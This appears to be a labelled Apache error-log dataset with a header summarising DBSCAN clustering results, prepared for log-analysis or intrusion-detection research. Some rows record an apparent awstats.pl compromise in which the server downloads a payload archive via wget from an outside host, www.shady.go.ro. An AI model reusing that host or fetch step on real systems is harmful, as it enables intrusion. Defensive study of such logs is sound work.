#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_error_log"
#  ~ Number of events in the dataframe: 3692
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['Type', 'Reason_Phrase', 'Message@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.2667928262068673  MinPts=2 (The EPS parameter was calculated in 0.011436 seconds)
#  ~ The DBSCAN clustering process was performed in 0.339325 seconds
#  ~ Results summary: (24 Clus. | 7 Outl. | Homg.: 99.87% | Comp.: 91.22% | V-measure: 95.35% | AR: 99.22% | AMI: 91.08%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 33 items. MV:["BK0"]. Details:{'BK': 33}
#       Cluster [1] contains 695 items. MV:["BB1"]. Details:{'BB': 695}
#       Cluster [2] contains 2291 items. MV:["BA2"]. Details:{'BA': 2291}
#       Cluster [3] contains 3 items. MV:["BE3"]. Details:{'BE': 3}
#       Cluster [4] contains 135 items. MV:["BL4"]. Details:{'BL': 135}
#       Cluster [5] contains 161 items. MV:["BJ5"]. Details:{'BJ': 160, 'BL': 1}
#       Cluster [6] contains 132 items. MV:["BC6"]. Details:{'BC': 132}
#       Cluster [7] contains 4 items. MV:["BJ7"]. Details:{'BJ': 4}
#       Cluster [8] contains 13 items. MV:["BJ8"]. Details:{'BJ': 13}
#       Cluster [9] contains 4 items. MV:["BJ9"]. Details:{'BJ': 4}
#       Cluster [10] contains 4 items. MV:["BJ10"]. Details:{'BJ': 4}
#       Cluster [11] contains 36 items. MV:["BG11"]. Details:{'BG': 36}
#       Cluster [12] contains 13 items. MV:["BG12"]. Details:{'BG': 13}
#       Cluster [13] contains 4 items. MV:["BH13"]. Details:{'BH': 4}
#       Cluster [14] contains 20 items. MV:["BJ14"]. Details:{'BJ': 20}
#       Cluster [15] contains 2 items. MV:["BJ15"]. Details:{'BJ': 2}
#       Cluster [16] contains 2 items. MV:["BJ16"]. Details:{'BJ': 2}
#       Cluster [17] contains 2 items. MV:["BJ17"]. Details:{'BJ': 2}
#       Cluster [18] contains 2 items. MV:["BJ18"]. Details:{'BJ': 2}
#       Cluster [19] contains 57 items. MV:["BJ19"]. Details:{'BJ': 57}
#       Cluster [20] contains 23 items. MV:["BD20"]. Details:{'BD': 23}
#       Cluster [21] contains 13 items. MV:["BI21"]. Details:{'BI': 13}
#       Cluster [22] contains 13 items. MV:["BJ22"]. Details:{'BJ': 13}
#       Cluster [23] contains 23 items. MV:["BF23"]. Details:{'BF': 23}
#
#  ~ Details of outliers: {'BE': 1, 'BG': 1, 'BJ': 4, 'BK': 1}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  BA  |  BB  |  BC  |  BD  |  BE  |  BF  |  BG  |  BH  |  BI  |  BJ  |  BK  |  BL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   BA   | 2291 |      |      |      |      |      |      |      |      |      |      |      |
#     |   BB   |      | 695  |      |      |      |      |      |      |      |      |      |      |
#     |   BC   |      |      | 132  |      |      |      |      |      |      |      |      |      |
#     |   BD   |      |      |      |  23  |      |      |      |      |      |      |      |      |
#     |   BE   |      |      |      |      |  3   |      |      |      |      |      |      |      |
#     |   BF   |      |      |      |      |      |  23  |      |      |      |      |      |      |
#     |   BG   |      |      |      |      |      |      |  49  |      |      |      |      |      |
#     |   BH   |      |      |      |      |      |      |      |  4   |      |      |      |      |
#     |   BI   |      |      |      |      |      |      |      |      |  13  |      |      |      |
#     |   BJ   |      |      |      |      |      |      |      |      |      | 283  |      |      |
#     |   BK   |      |      |      |      |      |      |      |      |      |      |  33  |      |
#     |   BL   |      |      |      |      |      |      |      |      |      |  1   |      | 135  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Reason_Phrase,Type,Message@,ClientIP$,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1109693145,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693219,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693294,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693374,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693451,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693525,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109693604,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109694260,"File does not exist","error","/var/www/html/scripts",9065096054037,"BA","S462","B_2"
1109695004,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695039,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695063,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695098,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695122,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695160,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695251,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695277,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695300,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695344,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695379,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695411,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695439,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695587,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695658,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695805,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695882,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109695958,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698429,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698478,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698503,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698536,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698589,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698673,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698709,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698736,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698757,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698779,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698818,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698854,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698880,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109698960,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109699042,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109699123,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109699336,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109699413,"File does not exist","error","/var/www/html/_vti_bin",9004152207238,"BA","S349","B_2"
1109705352,"Directory index forbidden by rule","error","/var/www/html/",9216073162091,"BB","S172","B_1"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709371,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709370,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709371,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109709373,"File does not exist","error","/var/www/html/scripts",9063084238040,"BA","S437","B_2"
1109711164,"Directory index forbidden by rule","error","/var/www/html/",9004035221243,"BB","S351","B_1"
1109717644,"File does not exist","error","/var/www/html/scripts",9066249194119,"BA","S480","B_2"
1109736715,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736717,"File does not exist","error","/var/www/html/MSADC",9061219099089,"BA","S405","B_2"
1109736717,"File does not exist","error","/var/www/html/c",9061219099089,"BA","S405","B_2"
1109736718,"File does not exist","error","/var/www/html/d",9061219099089,"BA","S405","B_2"
1109736719,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736719,"File does not exist","error","/var/www/html/_vti_bin",9061219099089,"BA","S405","B_2"
1109736720,"File does not exist","error","/var/www/html/_mem_bin",9061219099089,"BA","S405","B_2"
1109736721,"File does not exist","error","/var/www/html/msadc",9061219099089,"BA","S405","B_2"
1109736721,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736723,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736723,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736725,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109736726,"File does not exist","error","/var/www/html/scripts",9061219099089,"BA","S405","B_2"
1109752519,"File does not exist","error","/var/www/html/NULL.printer",9066018136228,"BA","S476","B_2"
1109760108,"Directory index forbidden by rule","error","/var/www/html/",9067170085231,"BB","S502","B_1"
1109760194,"Directory index forbidden by rule","error","/var/www/html/",9195166022231,"BB","S54","B_1"
1109764388,"Directory index forbidden by rule","error","/var/www/html/",9068201200065,"BB","S518","B_1"
1109773283,"Premature end of script headers","error","awstats.pl",9082052098248,"BJ","S581","B_19"
1109773583,"-","error","--09:29:25--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","           => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109773583,"Resolving www.shady.go.ro...","error","done.",9082052098248,"BJ","S581","B_7"
1109773583,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109773583,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","-",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","--09:32:43--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","  (try: 2) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109773583,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109773583,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","-",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","--09:35:54--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","  (try: 3) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109773583,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109773583,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","-",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","--09:39:06--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773583,"-","error","  (try: 4) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109773755,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109773755,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109773755,"-","error","-",9082052098248,"BJ","S581","B_5"
1109773759,"-","error","--09:42:19--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773759,"-","error","  (try: 5) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109773948,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109773948,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109773948,"-","error","-",9082052098248,"BJ","S581","B_5"
1109773953,"-","error","--09:45:33--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109773953,"-","error","  (try: 6) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109774142,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109774142,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109774142,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774148,"-","error","--09:48:48--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109774148,"-","error","  (try: 7) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109774337,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109774337,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109774337,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774344,"-","error","--09:52:04--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109774344,"-","error","  (try: 8) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109774533,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109774533,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109774533,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774541,"-","error","--09:55:21--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109774541,"-","error","  (try: 9) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109774730,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... failed: Connection timed out.",9082052098248,"BJ","S581","B_8"
1109774730,"-","error","Retrying.",9082052098248,"BJ","S581","B_5"
1109774730,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774739,"-","error","--09:58:39--  http://www.shady.go.ro/a.tgz",9082052098248,"BJ","S581","B_5"
1109774739,"-","error","  (try:10) => `a.tgz'",9082052098248,"BJ","S581","B_5"
1109774785,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... connected.",9082052098248,"BJ","S581","B_8"
1109774785,"HTTP request sent","error","awaiting response... 200 OK",9082052098248,"BJ","S581","B_9"
1109774785,"Length","error","8,086 [text/plain]",9082052098248,"BJ","S581","B_10"
1109774785,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774785,"-","error","    0K .......                                               100%   37.78 KB/s",9082052098248,"BJ","S581","B_5"
1109774785,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774785,"-","error","09:59:25 (37.78 KB/s) - `a.tgz' saved [8086/8086]",9082052098248,"BJ","S581","B_5"
1109774785,"-","error","-",9082052098248,"BJ","S581","B_5"
1109774785,"sh","error","/awstats.11.11.79.67.conf: No such file or directory",9082052098248,"BG","S581","B_11"
1109781957,"File does not exist","error","/var/www/html/default.ida",9172155134244,"BA","S36","B_2"
1109799830,"Directory index forbidden by rule","error","/var/www/html/",9216074229019,"BB","S173","B_1"
1109800131,"Directory index forbidden by rule","error","/var/www/html/",9220170233137,"BB","S263","B_1"
1109805282,"Directory index forbidden by rule","error","/var/www/html/",9210082034025,"BB","S134","B_1"
1109805523,"Directory index forbidden by rule","error","/var/www/html/",9218064024205,"BB","S216","B_1"
1109814255,"Directory index forbidden by rule","error","/var/www/html/",9070080223173,"BB","S562","B_1"
1109815207,"Directory index forbidden by rule","error","/var/www/html/",9058008000252,"BB","S352","B_1"
1109823843,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823856,"File does not exist","error","/var/www/html/MSADC",9203112195156,"BA","S87","B_2"
1109823863,"File does not exist","error","/var/www/html/c",9203112195156,"BA","S87","B_2"
1109823872,"File does not exist","error","/var/www/html/d",9203112195156,"BA","S87","B_2"
1109823876,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823879,"File does not exist","error","/var/www/html/_vti_bin",9203112195156,"BA","S87","B_2"
1109823886,"File does not exist","error","/var/www/html/_mem_bin",9203112195156,"BA","S87","B_2"
1109823894,"File does not exist","error","/var/www/html/msadc",9203112195156,"BA","S87","B_2"
1109823901,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823912,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823918,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823940,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109823947,"File does not exist","error","/var/www/html/scripts",9203112195156,"BA","S87","B_2"
1109831980,"Directory index forbidden by rule","error","/var/www/html/",9192195225006,"BB","S43","B_1"
1109836468,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836468,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836468,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836470,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836471,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836472,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836473,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836473,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836473,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836476,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836476,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836476,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836478,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836479,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109836479,"File does not exist","error","/var/www/html/get.asp",9219245156012,"BA","S252","B_2"
1109837937,"Directory index forbidden by rule","error","/var/www/html/",9204102106054,"BB","S95","B_1"
1109849277,"File does not exist","error","/var/www/html/default.ida",9172141217125,"BA","S34","B_2"
1109855159,"File does not exist","error","/var/www/html/default.ida",9081241004157,"BA","S572","B_2"
1109866364,"Directory index forbidden by rule","error","/var/www/html/",9203197081072,"BB","S91","B_1"
1109879756,"Directory index forbidden by rule","error","/var/www/html/",9061010007136,"BB","S364","B_1"
1109880757,"Directory index forbidden by rule","error","/var/www/html/",9060176242100,"BB","S354","B_1"
1109882112,"Directory index forbidden by rule","error","/var/www/html/",9064142009013,"BB","S440","B_1"
1109882946,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882947,"File does not exist","error","/var/www/html/MSADC",9067162217035,"BA","S498","B_2"
1109882947,"File does not exist","error","/var/www/html/c",9067162217035,"BA","S498","B_2"
1109882947,"File does not exist","error","/var/www/html/d",9067162217035,"BA","S498","B_2"
1109882948,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882948,"File does not exist","error","/var/www/html/_vti_bin",9067162217035,"BA","S498","B_2"
1109882948,"File does not exist","error","/var/www/html/_mem_bin",9067162217035,"BA","S498","B_2"
1109882948,"File does not exist","error","/var/www/html/msadc",9067162217035,"BA","S498","B_2"
1109882949,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882949,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882950,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882950,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109882950,"File does not exist","error","/var/www/html/scripts",9067162217035,"BA","S498","B_2"
1109889692,"Directory index forbidden by rule","error","/var/www/html/",9218022177022,"BB","S197","B_1"
1109891890,"File does not exist","error","/var/www/html/default.ida",9218062041222,"BA","S215","B_2"
1109893168,"Directory index forbidden by rule","error","/var/www/html/",9035011037228,"BB","S347","B_1"
1109894557,"Directory index forbidden by rule","error","/var/www/html/",9066176036061,"BB","S475","B_1"
1109898593,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898593,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898594,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898597,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898597,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898597,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109898597,"File does not exist","error","/var/www/html/scripts",9216084100130,"BA","S175","B_2"
1109899311,"Directory index forbidden by rule","error","/var/www/html/",9062177153106,"BB","S420","B_1"
1109901625,"File does not exist","error","/var/www/html/default.ida",9060208186049,"BA","S355","B_2"
1109905834,"Directory index forbidden by rule","error","/var/www/html/",9219133137045,"BB","S236","B_1"
1109908965,"Directory index forbidden by rule","error","/var/www/html/",9222166160009,"BB","S312","B_1"
1109911318,"Directory index forbidden by rule","error","/var/www/html/",9202226228178,"BB","S79","B_1"
1109918582,"Directory index forbidden by rule","error","/var/www/html/",9218070058153,"BB","S218","B_1"
1109921308,"sh","error","/awstats.11.11.79.67.conf: No such file or directory",9082049016150,"BG","S580","B_11"
1109923769,"-","error","--03:22:20--  http://www.shady.go.ro/a.tgz",9082049016150,"BJ","S580","B_5"
1109923769,"-","error","           => `a.tgz'",9082049016150,"BJ","S580","B_5"
1109923769,"Resolving www.shady.go.ro...","error","done.",9082049016150,"BJ","S580","B_7"
1109923769,"Connecting to www.shady.go.ro[81.196.20.134]","error","80... connected.",9082049016150,"BJ","S580","B_8"
1109923769,"HTTP request sent","error","awaiting response... 200 OK",9082049016150,"BJ","S580","B_9"
1109923769,"Length","error","8,086 [text/plain]",9082049016150,"BJ","S580","B_10"
1109923769,"-","error","-",9082049016150,"BJ","S580","B_5"
1109923769,"-","error","    0K .......                                               100%   35.10 KB/s",9082049016150,"BJ","S580","B_5"
1109923769,"-","error","-",9082049016150,"BJ","S580","B_5"
1109923769,"-","error","03:22:28 (35.10 KB/s) - `a.tgz' saved [8086/8086]",9082049016150,"BJ","S580","B_5"
1109923769,"-","error","-",9082049016150,"BJ","S580","B_5"
1109923769,"bind","error","Address already in use",9082049016150,"BJ","S580","B_OUTLIER"
1109923769,"sh","error","/awstats.11.11.79.67.conf: No such file or directory",9082049016150,"BG","S580","B_11"
1109926410,"Directory index forbidden by rule","error","/var/www/html/",9201252076247,"BB","S69","B_1"
1109939784,"File does not exist","error","/var/www/html/scripts",9066030071074,"BA","S482","B_2"
1109953649,"Directory index forbidden by rule","error","/var/www/html/",9219061092147,"BB","S254","B_1"
1109957483,"Directory index forbidden by rule","error","/var/www/html/",9061010007016,"BB","S368","B_1"
1109960088,"Directory index forbidden by rule","error","/var/www/html/",9169152251099,"BB","S28","B_1"
1109961063,"Directory index forbidden by rule","error","/var/www/html/",9208039169124,"BB","S110","B_1"
1109962090,"Directory index forbidden by rule","error","/var/www/html/",9220168069150,"BB","S260","B_1"
1109966496,"File does not exist","error","/var/www/html/_vti_bin",9216105210091,"BA","S165","B_2"
1109966846,"File does not exist","error","/var/www/html/_vti_bin",9216105210091,"BA","S165","B_2"
1109966873,"File does not exist","error","/var/www/html/_vti_bin",9216105210091,"BA","S165","B_2"
1109966894,"File does not exist","error","/var/www/html/_vti_bin",9216105210091,"BA","S165","B_2"
